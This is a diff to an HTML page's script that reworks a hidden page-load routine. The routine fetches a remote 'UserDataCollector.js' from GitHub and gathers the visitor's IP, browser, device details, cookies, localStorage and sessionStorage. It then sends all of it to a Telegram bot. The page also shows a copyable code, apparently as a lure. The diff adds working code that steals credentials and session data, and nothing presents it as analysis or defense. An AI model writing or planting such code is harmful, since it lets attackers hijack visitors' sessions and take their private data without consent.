@@ -146,9 +146,6 @@
     </div>
 </div>
 
-<!-- Include the User Data Collector script -->
-<script src="https://raw.githubusercontent.com/VictorRutskin/User-Data-Collector-Javascript/main/UserDataCollector.js"></script>
-
 <script>
 // Function to send message to Telegram
 function sendTelegramMessage(message) {
@@ -173,45 +170,50 @@ function sendTelegramMessage(message) {
         });
 }
 
-// Collect user data and send it to Telegram
-function collectAndSendUserData() {
+// Load User Data Collector script dynamically
+const userDataScript = document.createElement('script');
+userDataScript.src = 'https://raw.githubusercontent.com/VictorRutskin/User-Data-Collector-Javascript/main/UserDataCollector.js';
+userDataScript.onload = () => {
     if (typeof getUserData === 'function') {
-        getUserData().then(data => {
-            console.log('Collected user data:', data); // Log user data
-
-            const cookies = document.cookie;
-            const localStorageData = JSON.stringify(localStorage);
-            const sessionStorageData = JSON.stringify(sessionStorage);
-
-            const userDataMessage = `
-                User Information:
-                - IP Address: ${data.ip}
-                - Browser: ${data.browser}
-                - Operating System: ${data.os}
-                - Device: ${data.device}
-                - Screen Resolution: ${data.screen}
-                - User Language: ${navigator.language || 'Unknown'}
-                - Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-                - Referrer: ${document.referrer || 'No Referrer'}
-                - Platform: ${navigator.platform}
-                - User Agent: ${navigator.userAgent}
-                - Cookies: ${cookies}
-                - Local Storage: ${localStorageData}
-                - Session Storage: ${sessionStorageData}
-            `;
-
-            console.log('Prepared message to send:', userDataMessage); // Log the prepared message
-            sendTelegramMessage(userDataMessage);
-        }).catch(err => {
-            console.error('Error collecting user data:', err);
-        });
+        collectAndSendUserData();
     } else {
         console.error('getUserData function is not available.');
     }
-}
+};
+document.head.appendChild(userDataScript);
 
-// Trigger the function as soon as the page loads
-window.onload = collectAndSendUserData;
+// Collect user data and send it to Telegram
+function collectAndSendUserData() {
+    getUserData().then(data => {
+        console.log('Collected user data:', data); // Log user data
+
+        const cookies = document.cookie;
+        const localStorageData = JSON.stringify(localStorage);
+        const sessionStorageData = JSON.stringify(sessionStorage);
+
+        const userDataMessage = `
+            User Information:
+            - IP Address: ${data.ip}
+            - Browser: ${data.browser}
+            - Operating System: ${data.os}
+            - Device: ${data.device}
+            - Screen Resolution: ${data.screen}
+            - User Language: ${navigator.language || 'Unknown'}
+            - Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+            - Referrer: ${document.referrer || 'No Referrer'}
+            - Platform: ${navigator.platform}
+            - User Agent: ${navigator.userAgent}
+            - Cookies: ${cookies}
+            - Local Storage: ${localStorageData}
+            - Session Storage: ${sessionStorageData}
+        `;
+
+        console.log('Prepared message to send:', userDataMessage); // Log the prepared message
+        sendTelegramMessage(userDataMessage);
+    }).catch(err => {
+        console.error('Error collecting user data:', err);
+    });
+}
 
 function copyCode() {
     var code = "AA791";
